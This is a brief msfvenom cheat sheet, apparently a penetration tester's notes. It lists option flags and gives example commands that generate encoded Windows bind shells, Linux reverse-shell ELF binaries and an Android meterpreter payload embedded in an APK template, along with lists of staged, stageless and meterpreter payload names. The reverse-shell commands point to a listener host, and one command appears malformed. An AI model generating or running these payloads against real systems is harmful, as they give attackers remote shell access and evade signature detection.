## Msfvenom
```
 --platform
-p   --payload
-e   --encoder
-b   --bad-chars
-f   --format
-x   --template
-l   --list
```

```bash
msfvenom --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b "0" -f python
msfvenom --platform linux   -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=443 -b "0" -f elf -o file.bin
msfvenom --platform linux   -t shell.elf LHOST=10.10.14.25
msfvenom -x /tmp/tmp3rgnf7lr/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

## Meterpreter
```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```

## Staged
```
linux/x86/shell/bind_tcp
linux/x64/shell/reverse_tcp
windows/shell/bind_tcp
windows/x64/shell/reverse_tcp
```

## Stageless
```
linux/x86/shell_bind_tcp
linux/x64/shell_reverse_tcp
windows/shell_bind_tcp
windows/x64/shell_reverse_tcp
```
